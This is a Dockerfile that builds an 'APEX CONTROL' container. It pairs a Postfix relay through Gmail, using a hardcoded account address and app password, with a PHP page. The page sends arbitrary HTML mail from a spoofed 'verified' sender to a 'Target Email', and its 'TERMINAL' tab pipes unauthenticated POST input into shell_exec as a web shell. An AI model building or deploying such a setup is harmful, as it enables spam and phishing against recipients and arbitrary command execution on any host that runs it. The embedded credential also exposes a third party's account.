FROM alpine:latest

# 1. CORE SYSTEM INSTALL (ULTRA-STABLE)
RUN apk add --no-cache \
    postfix cyrus-sasl ca-certificates tzdata \
    nginx php83 php83-fpm \
    && update-ca-certificates

# 2. PRO-LEVEL SMTP ENGINE
RUN postconf -e "relayhost = [142.251.10.108]:587" \
    && postconf -e "smtp_sasl_auth_enable = yes" \
    && postconf -e "smtp_sasl_password_maps = static:pyypl2005@gmail.com:gnrbyxyyjxyoaljv" \
    && postconf -e "smtp_sasl_security_options = noanonymous" \
    && postconf -e "smtp_tls_security_level = encrypt" \
    && postconf -e "maillog_file = /dev/stdout" \
    && /usr/bin/newaliases

# 3. NGINX GATEWAY (OPTIMIZED FOR HTTPS & TIMEOUTS)
RUN mkdir -p /run/nginx && \
    echo 'server { \
    listen 80; \
    root /var/www/localhost/htdocs; \
    index index.php; \
    set_real_ip_from 0.0.0.0/0; \
    real_ip_header X-Forwarded-For; \
    location / { try_files $uri $uri/ =404; } \
    location ~ \.php$ { \
        fastcgi_pass 127.0.0.1:9000; \
        include fastcgi_params; \
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; \
        fastcgi_read_timeout 600; \
    } \
}' > /etc/nginx/http.d/default.conf

# 4. THE ULTIMATE UI (SSH + RELAY + LOGS)
# We use 'cat' with a quoted heredoc to ensure NO syntax failures.
RUN cat <<'EOF' > /var/www/localhost/htdocs/index.php
<?php
error_reporting(0);
$status = ""; $log = "[SYS] Node Active."; $cmd_out = "System Ready...";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["to"])) {
        $to = filter_var($_POST["to"], FILTER_SANITIZE_EMAIL);
        $sub = htmlspecialchars($_POST["subject"]);
        $msg = $_POST["message"];
        $h = "From: verified@elite.qzz.io\r\nContent-Type: text/html; charset=UTF-8";
        if (mail($to, $sub, $msg, $h)) { 
            $status = "success"; $log = "[RELAY] 250 OK - Injected."; 
        } else { 
            $status = "error"; $log = "[FATAL] SMTP Rejection."; 
        }
    } elseif (isset($_POST["cmd"])) {
        $cmd_out = shell_exec($_POST["cmd"] . " 2>&1");
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APEX CONTROL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #010409; color: #c9d1d9; font-family: ui-monospace, SFMono-Regular, monospace; }
        .apex-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
        .tab-active { color: #58a6ff; border-bottom: 2px solid #58a6ff; }
        input, textarea { background: #161b22 !important; border: 1px solid #30363d !important; color: #ecf2f8 !important; }
        input:focus { border-color: #58a6ff !important; outline: none; }
    </style>
</head>
<body class="p-4 md:p-10">
    <div class="max-w-5xl mx-auto">
        <header class="flex justify-between items-center mb-8">
            <h1 class="text-xl font-bold tracking-tight">APEX<span class="text-blue-500">_SYSTEM</span></h1>
            <span class="text-[10px] bg-blue-500/10 text-blue-500 px-2 py-1 rounded border border-blue-500/20 font-bold">STABLE_V4</span>
        </header>

        <div class="flex space-x-6 mb-6 border-b border-[#30363d]">
            <button onclick="st('d', this)" class="pb-3 text-sm font-semibold tab-active">RELAY</button>
            <button onclick="st('s', this)" class="pb-3 text-sm font-semibold text-gray-500">TERMINAL</button>
            <button onclick="st('l', this)" class="pb-3 text-sm font-semibold text-gray-500">LOGS</button>
        </div>

        <div id="d" class="tab-content block">
            <div class="apex-card p-6">
                <form method="POST" class="space-y-4">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                        <input name="to" required class="p-3 rounded-md text-sm" placeholder="Target Email">
                        <input name="subject" required class="p-3 rounded-md text-sm" placeholder="Subject">
                    </div>
                    <textarea name="message" rows="8" required class="w-full p-3 rounded-md text-sm" placeholder="Payload..."></textarea>
                    <button class="w-full bg-[#238636] hover:bg-[#2ea043] text-white font-bold py-3 rounded-md text-sm transition-all">EXECUTE DEPLOY</button>
                </form>
            </div>
        </div>

        <div id="s" class="tab-content hidden">
            <div class="apex-card p-4 bg-black">
                <div class="h-96 overflow-y-auto mb-4 text-xs text-green-500 p-2">
                    <pre><?php echo htmlspecialchars($cmd_out); ?></pre>
                </div>
                <form method="POST" class="flex items-center space-x-2 border-t border-[#30363d] pt-4">
                    <span class="text-blue-500 font-bold">$</span>
                    <input name="cmd" autofocus class="flex-grow bg-transparent border-none text-sm p-1" placeholder="ls -la">
                </form>
            </div>
        </div>

        <div id="l" class="tab-content hidden">
            <div class="apex-card p-6 space-y-4">
                <div class="text-xs uppercase font-bold text-gray-500">Live Feedback Log</div>
                <div class="p-4 bg-black rounded border border-[#30363d] text-blue-400 text-xs">
                    <?php echo $log; ?>
                </div>
                <div class="text-xs uppercase font-bold text-gray-500 mt-6">Postfix Queue</div>
                <pre class="text-[10px] text-gray-400"><?php system("postqueue -p"); ?></pre>
            </div>
        </div>
    </div>

    <script>
        function st(id, btn) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.replace('block', 'hidden'));
            document.querySelectorAll('button').forEach(b => b.classList.remove('tab-active', 'text-gray-500'));
            document.querySelectorAll('button').forEach(b => b.classList.add('text-gray-500'));
            document.getElementById(id).classList.replace('hidden', 'block');
            btn.classList.add('tab-active');
            btn.classList.remove('text-gray-500');
        }
    </script>
</body>
</html>
EOF

# 5. EXECUTION LAYER
RUN chown -R nginx:nginx /var/www/localhost/htdocs
EXPOSE 80
CMD php-fpm83 && sleep 2 && nginx && postfix start-fg
